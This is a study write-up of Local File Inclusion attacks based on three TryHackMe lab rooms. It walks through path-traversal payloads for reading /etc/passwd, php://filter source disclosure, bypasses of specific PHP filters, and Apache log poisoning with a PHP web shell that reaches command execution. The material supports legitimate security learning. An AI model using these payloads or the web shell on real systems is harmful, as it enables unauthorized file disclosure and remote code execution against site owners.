# Local File Inclusion — notes from three rooms

## Introduction

Local File Inclusion (LFI) occurs when a web application includes a file from the local server based on user input. It is one of the file inclusion vulnerabilities, alongside Remote File Inclusion (RFI), where the included file comes from a remote location the attacker controls. At its simplest, LFI lets an attacker read files they should not have access to, such as configuration files or `/etc/passwd`. In the right conditions it can be taken further, from reading files to executing commands, for example by including a file that already contains attacker-controlled data such as the web server's access logs.

LFI is not caused by "including files". Every app includes files. It is caused by letting user input decide which file gets included, without validation. Frameworks like Laravel include files safely by resolving names internally; the vulnerability appears only when a developer puts user-controlled input into a file-loading function.

The sections below walk through the main LFI techniques in three phases, using rooms I worked through on TryHackMe as examples. 

> The three rooms are [Red](./03-Red.md), [Archangel](./04-Archangel.md), and [Dogcat](./05-Dogcat.md), each written up separately in this repository.

## Phase 1: Bypassing Filters & Reading Source Code (The PHP Filter Trick)

The first thing to do when you see something that looks like it might have an LFI vulnerability is to try the normal payload, like this:

```url
/../../../../etc/passwd
```

The dots and slashes are usually four, since most web application work from the directory `var/www/html`, but when there are more directories involved, you might need to add more. In some scenarios this just works, and in others it does not. When it does not, you have to read the source code (`index.php`, or the PHP part of `index.html`). Here are some ways I have actually encountered when doing the TryHackMe rooms.

### Scenario 1: The simple case

Here the URL looked like this:

```url
http://<Machine IP>/index.php?page=home.html
```

I read the PHP source by replacing `home.html` with `index.php`, viewing it through the browser's view-source (otherwise it just shows blank, since it is a PHP file with no HTML or CSS to render).

### Scenario 2: Using the PHP Filter Wrapper

Most scenarios are not as easy as that. When you cannot read `index.php` (or other PHP source) directly, you have to try a different way, and this is where the `php://filter` wrapper comes in. It works almost all the time. The method is to encode the PHP source into base64 and have it returned on screen, since base64 is just text and will not execute. Here are two examples I encountered.

Example 1 (from Archangel): 

```url
http://<Machine IP>/?view=/var/www/html/development_testing/test.php
```
Adding the wrapper:

```url
http://<Machine IP>/?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```

This returns the source code in base64. After decoding it, you can read it.

Example 2 (from Dogcat):

```url
http://<Machine IP>/?view=dog
```

As with example 1, you add the wrapper:

```url
http://<Machine IP>/?view=php://filter/convert.base64-encode/resource=dog
```

To sum up, phase one is about checking whether a vulnerability is there, how to read the source code, and whether there is a way to bypass any filtering:

- First, check with the normal payload.
- Second, see if you can read index.php just by inserting the name in the URL.
- Third, use the `php://filter` wrapper if the above fail; this will almost always let you read the code.

## Phase 2: Escaping Extensions and Constraints

This phase is about determining whether you can escape the constraints set by the code. It involves reading the code, understanding it, and figuring out how to bypass it.

### Scenario 1 (from Red): 

The php code looked like this:

```php
<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>
```

The first part removes every `../` and `./` from the input. A normal payload like `../../../../etc/passwd` would have all of its `../` stripped out, leaving just `etc/passwd`, which does not traverse anywhere. The bypass works because the replacement runs only once and does not look at what the string becomes afterward: a sequence like `.....///` has its inner `./` and `../` removed, and the characters left over collapse back into a working `../`. The second part of the code also requires the input to start with a character from `a-z`. So, to satisfy both, we can use:

```url
http://<Machine IP>/index.php?page=a/.....///.....///.....///.....///etc/passwd
```

The leading letter can be anything from `a-z`, or even a longer word.

Note that this room uses `readfile`, which only reads a file's contents and never executes them, so the log-poisoning route in Phase 3 is not possible here, that requires `include`.

### Scenario 2 (from Archangel)

The PHP code from this scenario:

```php
<?php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}
if(isset($_GET["view"])){
    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
        include $_GET['view'];
    } else {
        echo 'Sorry, Thats not allowed';
    }
}
?>
```

This means the path must not contain `../..` and must contain `/var/www/html/development_testing`. A simple way to bypass it:

```url
http://<Machine IP>/?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd
```

You can also use `/.././../`. It only blocks the literal string `../..`.

### Scenario 3 (from Dogcat)

The PHP code for this scenario:

```php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
        if(isset($_GET['view'])) {
            if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                echo 'Here you go!';
                include $_GET['view'] . $ext;
            } else {
                echo 'Sorry, only dogs or cats are allowed.';
            }
    }
?>
```

It checks that the input contains `dog` or `cat`, and if you do not supply an extension, it appends `.php` by default. The string check looks at the input, but the filesystem resolves the real path, so a prefix like `dog/../` contains "dog" (passing the check) while canceling itself out on disk. The forced `.php` can be removed by passing an empty `ext`. To bypass it:

```url
http://<Machine IP>/?view=dog/../../../../etc/passwd&ext=
```

Once you can read files you are not normally supposed to, the file-reading side of LFI finishes here. In CTFs you might read a history file, or user files, if you have permission. Otherwise you have to find another way to get access, such as log poisoning.

## Phase 3: Leveling Up from LFI to RCE (Log Poisoning)

This is used when you find no other way to get initial access to the machine. For this you might need external tools like Burp Suite or cURL. It is only possible when the vulnerable code uses `include` (which executes the file), not `readfile` (which only reads it).

The idea: in many Linux systems the web logs are stored at `/var/log/apache2/access.log` (you have to confirm it is Apache, since some servers differ; this is based on my own encounters, which were all in that location). The access log records the User-Agent of each request. If you send a request whose User-Agent contains a small PHP payload, that code is written into the log. Then, by including the log through the LFI, the planted code executes.

So the order matters: first send the poisoning request (the payload in the User-Agent), then include the log file. A payload for running commands:

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

A note on the difference between the two (from my research):

- `system()` runs the command and prints its output directly, and historically also returns the last line of output.
- `passthru()` is used when the command's output is raw data (an image, a binary, a raw stream) that needs to be passed back to the browser untouched.

After placing the payload in the User-Agent, the includes become:

```url
http://<Machine IP>/?view=/var/www/html/development_testing/..//..//..//log/apache2/access.log&cmd=id
http://<Machine IP>/?view=dog/../../../../../var/log/apache2/access.log&cmd=id&ext=
```

After a couple of refreshes you will see the `id` output for the current user, which is almost always `www-data`. From there the usual next step is a reverse shell.

## Conclusion

This is my understanding of LFI and log poisoning, based on my encounters with TryHackMe's challenge rooms, which I have covered separately in this repository. I decided to write up the LFI rooms because this was an area I felt very weak in, so much so that I avoided one room for more than two months (now covered as well). These methods are not exhaustive, and I still have a lot to learn here. But they gave me the initial path to see it through, so I will not run away from this the next time I see it.
